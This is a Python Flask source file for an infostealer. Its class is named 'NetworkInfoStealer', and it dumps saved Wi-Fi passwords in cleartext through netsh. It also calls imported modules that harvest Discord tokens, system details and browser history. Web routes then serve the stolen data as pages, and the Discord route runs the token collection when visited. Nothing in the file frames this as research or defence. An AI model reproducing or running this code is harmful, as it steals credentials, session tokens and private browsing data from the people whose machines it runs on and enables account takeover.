import os
import subprocess
from flask import Flask, jsonify, render_template_string
from browser_history import get_history
from modules.applications import DiscordRecovery
from modules.systeminfo import SystemInfoRecovery
from modules.browsers import WebHistoryRecovery


app = Flask(__name__)

class ModuleManager:
    def __init__(self, module_name):
        self.module_name = module_name
        self.output_folder_user = os.getcwd()  # Save files in the current directory

    def mdebug(self, message):
        print(f"[DEBUG] {message}")

    def mprint(self, message):
        print(message)

    def merror(self, message):
        print(f"[ERROR] {message}")

class NetworkInfoRecovery(ModuleManager):
    def __init__(self):
        super().__init__(module_name="NetworkInfoStealer")
        self.systeminfo_folder = os.path.join(self.output_folder_user, 'network')
        self.ipconfig_filename = os.path.join(self.systeminfo_folder, 'ipconfig.txt')
        self.wifi_passwords_filename = os.path.join(self.systeminfo_folder, 'wifi_passwords.txt')

        if not os.path.isdir(self.systeminfo_folder):
            os.makedirs(self.systeminfo_folder)

    def ipconfig(self):
        self.mdebug("[ipconfig] Running command: `ipconfig /all`")
        data = subprocess.check_output(['ipconfig', '/all']).decode('utf-8', errors="backslashreplace")
        with open(self.ipconfig_filename, 'w', encoding='utf-8') as _file:
            _file.write(data)
            self.mprint(f"[ipinfo] Saved result to {self.ipconfig_filename}")

    def get_wifi_passwords(self):
        with open(self.wifi_passwords_filename, 'w+') as file:
            self.mdebug(f"Creating file and starting to save wifi passwords to it -> {self.wifi_passwords_filename}")
            self.mdebug(f"Running command: `netsh wlan show profiles`")

            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
            profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]

            self.mdebug(f"Found a total of {len(profiles)} WiFi networks")

            for i in profiles:
                try:
                    self.mdebug(f"Running command: `netsh wlan show profile {i} key=clear`")
                    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')

                    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                    file.write("\n{:<30}|  {:<}".format(i, results[0] if results else ""))
                except Exception as e:
                    self.merror(f"Unable to get the wifi password of {i} network -> {e}")
                    file.write("\n{:<30}|  {:<}".format(i, "ERROR"))

    def run(self):
        self.ipconfig()
        self.get_wifi_passwords()

# Initialize modules
system_info = SystemInfoRecovery()
system_info.run()

network_info = NetworkInfoRecovery()
network_info.run()

discord_recovery = DiscordRecovery()


@app.route('/')
def index():
    with open(network_info.ipconfig_filename, 'r', encoding='utf-8') as file:
        ipconfig_data = file.read()

    with open(network_info.wifi_passwords_filename, 'r', encoding='utf-8') as file:
        wifi_passwords_data = file.read()

    return render_template_string('''
    <!doctype html>
    <html lang="en">
      <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <title>Network Information and Wi-Fi Passwords</title>
      </head>
      <body>
        <h1>Network Information</h1>
        <pre>{{ ipconfig_data }}</pre>

        <h1>Wi-Fi Passwords</h1>
        <pre>{{ wifi_passwords_data }}</pre>
      </body>
    </html>
    ''', ipconfig_data=ipconfig_data, wifi_passwords_data=wifi_passwords_data)

@app.route('/system_info')
def system_info_display():
    # Define paths for system information files
    filenames = {
        'System Info': system_info.systeminfo_filename,
        'Computer Info': system_info.computerinfo_filename,
        'Motherboard Info': system_info.motherboard_filename,
        'CPU Info': system_info.cpu_filename,
        'Sound Info': system_info.sounds_filename,
    }

    # Read data from each file
    file_contents = {}
    for title, filename in filenames.items():
        if os.path.exists(filename):
            with open(filename, 'r', encoding='utf-8') as file:
                file_contents[title] = file.read()
        else:
            file_contents[title] = "No data found."

    # Render the contents in HTML format
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>System Information</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; }
            h1 { color: #333; }
            pre { background-color: #f4f4f4; padding: 10px; border-radius: 5px; }
        </style>
    </head>
    <body>
        <h1>System Information Recovery Output</h1>
        {% for title, content in file_contents.items() %}
            <h2>{{ title }}</h2>
            <pre>{{ content }}</pre>
        {% endfor %}
    </body>
    </html>
    ''', file_contents=file_contents)

@app.route('/discord_tokens')
def discord_tokens():
    # Run the discord token recovery process
    discord_recovery.run()

    # Define the folder where discord tokens are saved
    discord_folder = discord_recovery.discord_folder
    tokens_files = [f for f in os.listdir(discord_folder) if f.endswith('.txt')]

    # Read tokens from all files
    tokens_data = {}
    for token_file in tokens_files:
        file_path = os.path.join(discord_folder, token_file)
        with open(file_path, 'r', encoding='utf-8') as file:
            tokens_data[token_file] = file.read()

    # Render the tokens in HTML format
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Discord Token Recovery</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; }
            h1 { color: #333; }
            pre { background-color: #f4f4f4; padding: 10px; border-radius: 5px; }
        </style>
    </head>
    <body>
        <h1>Recovered Discord Tokens</h1>
        {% for file, tokens in tokens_data.items() %}
            <h2>{{ file }}</h2>
            <pre>{{ tokens }}</pre>
        {% endfor %}
    </body>
    </html>
    ''', tokens_data=tokens_data)

@app.route('/web-history', methods=['GET'])
def get_web_history():
    try:
        history = get_history()
        entries = history.histories  # Get the list of history entries

        # Render the web history as an HTML table
        return render_template_string('''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Web History</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 20px; }
                h1 { color: #333; }
                table { width: 100%; border-collapse: collapse; margin-top: 20px; }
                th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
                th { background-color: #f2f2f2; }
                tr:hover { background-color: #f1f1f1; }
            </style>
        </head>
        <body>
            <h1>Web History</h1>
            <table>
                <tr>
                    <th>Timestamp</th>
                    <th>URL</th>
                </tr>
                {% for entry in entries %}
                <tr>
                    <td>{{ entry.timestamp }}</td>
                    <td>{{ entry.url }}</td>
                </tr>
                {% endfor %}
            </table>
        </body>
        </html>
        ''', entries=[{"url": entry[1], "timestamp": entry[0].strftime('%Y-%m-%d %H:%M:%S')} for entry in entries])
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True)
